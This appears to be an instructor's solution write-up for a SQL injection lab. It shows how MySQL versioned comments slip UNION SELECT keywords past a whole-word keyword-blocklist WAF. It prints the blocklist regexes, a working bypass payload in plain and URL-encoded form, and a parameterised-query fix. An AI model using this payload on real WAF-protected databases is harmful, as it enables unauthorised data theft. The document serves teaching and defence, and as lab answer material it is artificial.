# Solution — sqli-waf-bypass-versioned-comments-mysql

<!-- Instructor/authoring reference. Students should try the hints first. -->

> **Architecture note (simplification).** The `data/catalog.json` spec lists this
> lab's stack as `PHP 8.3` behind `nginx 1.27 with ModSecurity 3.0 + OWASP CRS 4.0
(paranoia level 2)`. This implementation **omits both nginx/ModSecurity and PHP**:
> the app is Python/Flask on gunicorn, and the "WAF" is a small in-process keyword
> filter (`gizmo-waf`) that faithfully reproduces the relevant CRS behaviour — a
> case-insensitive, whole-word blocklist of SQL keywords (the 942xxx family) plus
> the `-- ` and `#` comment-sequence rules. Running a real ModSecurity+CRS sidecar
> would add a large, network-attached container and a paranoia-level tuning rabbit
> hole without changing the lesson: the bypass depends only on the WAF matching
> **bare** keywords while MySQL executes keywords hidden in **versioned comments**.
> Modelling the filter in-app keeps the image small and the hardening posture
> identical to the other Python SQLi labs (app + a hardened non-root MySQL), while
> `/waf-log` exposes the fired rule IDs exactly as a CRS audit log would.

## What tipped you off

`/search?q=phone` filters the product list, so `q` clearly reaches SQL. The naive
probe `/search?q=' UNION SELECT 1,2-- ` does **not** return a database error — it
returns **HTTP 403** from `gizmo-waf`, and `/waf-log` lists the rules that fired
(`942100` UNION, `942110` SELECT, `942200` `-- `). A separate filter layer that
rejects your keywords _before_ the query runs is the signature of a blocklist WAF,
and the fact that it names the rules that fired hands you a precise oracle for
tuning a bypass.

## The class of bug

SQL injection (**CWE-89**, OWASP **A03:2021 – Injection**) in a single-quoted
`LIKE` context, guarded by an **incomplete blocklist**. The defence is a signature
filter, not parameterisation, so it can only ever reject the exact byte-patterns it
knows about. The exploit is a classic **impedance mismatch**: the WAF and the
database disagree about what counts as a SQL keyword. The WAF matches keywords as
whole words (`\bSELECT\b`); MySQL executes keywords wrapped in _versioned comments_
(`/*!50000SELECT*/`), where the leading digits erase the word boundary the regex
depends on.

## Vulnerability

`src/app.py`, `/search`:

```python
fired = waf_scan(q)              # blocklist regex over the RAW input
if fired:
    return Response(..., status=403)   # 403 + logged rule IDs

sql = "SELECT name, price FROM products WHERE name LIKE '%" + q + "%'"
```

`q` is concatenated into the query with no parameterization, escaping, or
allowlisting. The only thing standing between the attacker and the parser is
`waf_scan`, whose rules look like:

```python
("942110", "... SELECT ...", re.compile(r"\bselect\b", re.I)),
("942100", "... UNION ...",  re.compile(r"\bunion\b",  re.I)),
("942120", "... FROM ...",   re.compile(r"\bfrom\b",   re.I)),
("942200", "... '-- ' ...",  re.compile(r"--\s")),
...
```

## Why the developer wrote it this way

This is the "we already have a WAF" trap. Rather than fix the concatenated query
(which they suspected was risky), the team put a keyword filter in front of it and
called the risk mitigated. A blocklist _feels_ safe because it visibly blocks every
payload the author thinks to test — `' OR 1=1`, `UNION SELECT`, `; DROP TABLE`.
Whole-word matching was chosen deliberately, to avoid flagging innocent product
names that merely _contain_ a keyword (e.g. a product with "or" in its name). That
very refinement is what the bypass exploits.

## Why it exists

A blocklist can only reject what it can recognise, and the recogniser (a Python
regex) does not parse SQL the way MySQL does. MySQL's _versioned comment_ syntax,
`/*!NNNNN <sql> */`, tells the server "execute `<sql>` if your version is at least
`NNNNN`". On MySQL 8.4 (version ≥ 5.00.00), `/*!50000UNION*/` is executed as
`UNION`. But to the WAF's `\bUNION\b` rule, the text is `50000UNION`: the digit `0`
immediately before `U` is a word character, so there is **no word boundary** before
`UNION`, and the rule does not match. The keyword is simultaneously invisible to the
filter and meaningful to the database. The `-- ` and `#` bans are sidestepped a
different way — instead of commenting out the trailing `%'`, we simply close and
re-balance the string literal.

## The mechanical exploit

1. **Confirm the WAF and read its rules.** Send the naive attack and watch it fail:

   ```
   /search?q=' UNION SELECT waf_bypass_flag,NULL FROM secrets--
   -> 403 ;  /waf-log shows 942100 (UNION), 942110 (SELECT), 942120 (FROM), 942200 (-- )
   ```

2. **Wrap every keyword in a versioned comment.** `UNION` → `/*!50000UNION*/`,
   `SELECT` → `/*!50000SELECT*/`, `FROM` → `/*!50000FROM*/`, `WHERE` →
   `/*!50000WHERE*/`. None of these match a whole-word rule.

3. **Avoid the banned comment terminators.** You cannot end with `-- ` or `#`, so
   do not comment out the query's trailing `%'`. Instead, close the `LIKE` literal
   and finish with a comparison that swallows the trailing quotes:
   `... /*!50000WHERE*/ '%'='` — the template's closing `%'` completes it as
   `'%'='%'`, a true condition, and every string literal is balanced.

The winning `q` (two columns, secret in the `name` slot, `NULL` padding the price):

```
nonexistent%' /*!50000UNION*/ /*!50000SELECT*/ waf_bypass_flag,NULL /*!50000FROM*/ secrets /*!50000WHERE*/ '%'='
```

## Exploit walkthrough

URL-encoded request, then read the 32-hex secret from the rendered product list:

```
GET /search?q=nonexistent%25%27%20%2F*!50000UNION*%2F%20%2F*!50000SELECT*%2F%20waf_bypass_flag%2CNULL%20%2F*!50000FROM*%2F%20secrets%20%2F*!50000WHERE*%2F%20%27%25%27%3D%27
-> ... <li>{32-hex secret} — $</li> ...
```

With the versioned comments interpreted, the server runs:

```sql
SELECT name, price FROM products
WHERE name LIKE '%nonexistent%' UNION SELECT waf_bypass_flag,NULL FROM secrets WHERE '%'='%'
```

`'%nonexistent%'` matches no products; the `UNION SELECT` appends the `secrets` row
(the value lands in the `name` position); `WHERE '%'='%'` is trivially true. Then
trade the value for the flag:

```
GET /solve?flag={32-hex secret}   ->   200  FLAG{...}
```

`tests/exploit.py` performs exactly this with the standard library only: it first
fires the naive payload and confirms via `/waf-log` that the WAF blocked it, then
sends the versioned-comment payload, extracts the secret dynamically (it is random
per container), and asserts the recovered flag equals the HMAC-derived expected
value. It finishes in well under a second of request time.

## Fix

The WAF is a distraction; the real fix is to stop building SQL from strings. Bind
the value as a parameter and let the driver ship it as data that can only ever be
compared against the `name` column:

```python
sql = "SELECT name, price FROM products WHERE name LIKE %s"
try:
    with conn.cursor() as cur:
        cur.execute(sql, ("%" + q + "%",))   # q is a value, never code
        rows = cur.fetchall()
except Exception:
    app.logger.exception("search failed")
    return Response("Search is temporarily unavailable.", status=500)
```

With a bound parameter, `/*!50000UNION*/ /*!50000SELECT*/ ...` is matched literally
against product names and finds nothing — the comment, the quote, and the `UNION`
never reach the parser as code. A keyword blocklist should at most be **defence in
depth** behind parameterised queries, never the primary control: signature filters
are inherently incomplete (here, versioned comments; elsewhere, inline `/**/`
separators, alternate whitespace, encoding, or keyword casing/nesting all defeat
them). If you must keep a WAF, prefer a positive-security (allowlist) model for the
fields that reach SQL, and treat any blocklist bypass as a bug in the application,
not just the filter.
